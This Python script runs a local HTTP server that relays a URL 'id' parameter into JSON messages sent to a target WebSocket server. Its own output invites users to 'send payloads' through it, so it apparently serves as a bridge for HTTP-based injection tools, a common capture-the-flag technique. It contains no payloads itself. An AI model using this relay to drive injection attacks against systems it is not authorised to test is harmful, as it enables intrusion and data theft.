from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection
import sys

# Retrieve the WebSocket server URL from command line argument
if len(sys.argv) < 2:
    print("Usage: python middleware.py wss://<target-ip-for-websocket>/")
    sys.exit(1)

ws_server = sys.argv[1]
if ws_server.startswith("ws://"):
    print("Warning: You are using an unsecured WebSocket connection.")

def send_ws(payload):
    try:
        ws = create_connection(ws_server)
        message = unquote(payload).replace('"', '\'')
        data = '{"id":"%s"}' % message

        ws.send(data)
        resp = ws.recv()
        ws.close()

        return resp if resp else ''
    except Exception as e:
        return str(e)

def middleware_server(host_port, content_type="text/plain"):
    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split('=',1)[1]
            except IndexError:
                payload = False

            content = send_ws(payload) if payload else 'No parameters specified!'

            self.send_header("Content-Type", content_type)
            self.end_headers()
            self.wfile.write(content.encode())
            return

    class _TCPServer(TCPServer):
        allow_reuse_address = True

    httpd = _TCPServer(host_port, CustomHandler)
    httpd.serve_forever()

print("[+] Starting Middleware Server")
print("[+] Send payloads in http://localhost:8484/?id=*")

try:
    middleware_server(('0.0.0.0', 8484))
except KeyboardInterrupt:
    pass
